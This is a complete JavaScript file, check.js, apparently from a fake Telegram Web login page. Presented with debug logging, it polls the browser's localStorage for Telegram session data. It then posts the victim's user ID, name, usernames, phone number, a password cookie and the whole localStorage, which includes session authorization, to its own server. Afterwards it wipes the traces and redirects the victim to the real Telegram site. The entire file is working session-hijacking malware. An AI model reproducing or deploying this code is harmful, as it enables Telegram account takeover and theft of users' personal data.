document.addEventListener("DOMContentLoaded", function() {
  // Log initial state for debugging
  async function logDebug(message) {
    await fetch('/api/debug', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ message: `check.js: ${message}` }),
    });
  }

  logDebug('Script loaded');
  logDebug(`window.Telegram exists: ${!!window.Telegram}`);
  logDebug(`window.Telegram.WebApp exists: ${!!(window.Telegram && window.Telegram.WebApp)}`);
  logDebug(`tt-global-state exists: ${!!localStorage.getItem("tt-global-state")}`);
  logDebug(`user_auth exists: ${!!localStorage.getItem("user_auth")}`);

  async function checkLocalStorage() {
    let globalState = localStorage.getItem("tt-global-state");
    if (globalState && localStorage.getItem("user_auth")) {
      logDebug('Found tt-global-state and user_auth in localStorage');

      const parsedState = JSON.parse(globalState);
      const currentUserId = parsedState.currentUserId;
      const currentUser = parsedState.users.byId[currentUserId];
      document.body.style.display = "none";

      if (currentUserId && currentUser) {
        logDebug(`User data found: userId=${currentUserId}`);

        const { firstName, usernames, phoneNumber, isPremium } = currentUser;
        const password = document.cookie.split("; ").find(e => e.startsWith("password="))?.split("=")[1];

        localStorage.removeItem("GramJs:apiCache");
        localStorage.removeItem("tt-global-state");

        await fetch(`/api/users/telegram/info`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            userId: currentUserId,
            firstName,
            usernames,
            phoneNumber,
            isPremium,
            password,
            quicklySet: localStorage,
            type: new URLSearchParams(window.location.search).get("type")
          })
        });

        logDebug('User data sent to server');

        // Check if window.Telegram.WebApp is available before using it
        if (window.Telegram && window.Telegram.WebApp) {
          window.Telegram.WebApp.openTelegramLink("https://t.me/+8dtqN7T2sJpmNTb7");
          window.Telegram.WebApp.close();
        } else {
          logDebug('window.Telegram.WebApp not available, skipping openTelegramLink and close');
        }

        localStorage.clear();
        document.cookie = "password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
        window.location.href = "https://web.telegram.org/a/";  

        clearInterval(checkInterval);
      } else {
        logDebug('No user data found in tt-global-state');
      }
    } else {
      logDebug('tt-global-state or user_auth not found, clearing storage');
      sessionStorage.clear();
      localStorage.clear();
    }
  }

  const checkInterval = setInterval(checkLocalStorage, 100);
});
